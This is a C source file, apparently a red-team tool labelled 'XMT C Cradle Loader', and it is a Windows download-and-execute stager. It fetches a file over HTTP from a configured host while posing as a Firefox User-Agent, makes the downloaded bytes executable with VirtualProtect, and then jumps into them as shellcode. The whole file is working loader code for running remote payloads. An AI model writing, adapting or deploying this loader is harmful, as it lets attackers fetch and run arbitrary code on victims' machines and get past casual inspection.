// XMT C Cradle Loader
// iDigitalFlame

#define HOST "vmhost\0"
#define PORT "8081\0"
#define PATH "s.txt\0"
#define _WIN32_WINNT 0x0501

#include <ws2tcpip.h>

int get(char *host, char *port, char *path, unsigned char **buffer) {
    SOCKET s;
    struct addrinfo i, *a, *c;
    memset(&i, 0, sizeof(i));
    i.ai_family = PF_INET;
    i.ai_socktype = SOCK_STREAM;
    if (getaddrinfo(host, port, &i, &a) != 0) {
        return 0;
    }
    for (c = a; c != NULL; c = c->ai_next) {
        s = socket(c->ai_family, c->ai_socktype, c->ai_protocol);
        if (s == INVALID_SOCKET) {
            continue;
        }
        if (connect(s, c->ai_addr, (int)c->ai_addrlen) != SOCKET_ERROR) {
            break;
        }
        closesocket(s);
    }
    freeaddrinfo(a);
    unsigned char *m = malloc(256 + strlen(host) + strlen(port) + strlen(path));
    strcpy(m, "GET /\0");
    strncat(m + 5, path, strlen(path));
    strncat(m, " HTTP/1.1\r\nHost: \0", 19);
    strncat(m, host, strlen(host));
    strcat(m, ":\0");
    strncat(m, port, strlen(port));
    strncat(m, "\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:70.1) Gecko/20100101 Firefox/71.0\r\nAccept: text/html\r\n\r\n\0", 151);
    if (send(s, m, strlen(m), 0) == SOCKET_ERROR) {
        closesocket(s);
        return 0;
    }
    free(m);
    int t = 0;
    int r = 0;
    int p = 4096;
    unsigned char *y = NULL;
    unsigned char *b = calloc(4096, 1);
    for (;;) {
        r = recv(s, b + t, 4096, 0);
        if (r <= 0) {
            break;
        }
        if (t + r > p) {
            y = b;
            if ((b = realloc(b, (t + r) * 2)) == NULL) {
                b = y;
                break;
            }
            p = (t + r) * 2;
        }
        t += r;
    }
    p = 0;
    for (r = 0; r < t && p < 4; r++) {
        if (b[r] == '\r' || b[r] == '\n') {
            p++;
        } else {
            p = 0;
        }
    }
    *buffer = malloc(t - r);
    memcpy(*buffer, b + r, t - r);
    free(b);
    closesocket(s);
    return t - r;
}
int main() {
    WSADATA w;
    if (WSAStartup(MAKEWORD(2, 2), &w) != 0) {
        return 1;
    }
    unsigned char *b;
    int s = get(HOST, PORT, PATH, &b);
    WSACleanup();
    if (s == 0) {
        return 1;
    }
    DWORD o;
    if (VirtualProtect(b, s, PAGE_EXECUTE_READWRITE, &o) == 0) {
        return 1;
    }
    ((void (*)())b)();
    return 0;
}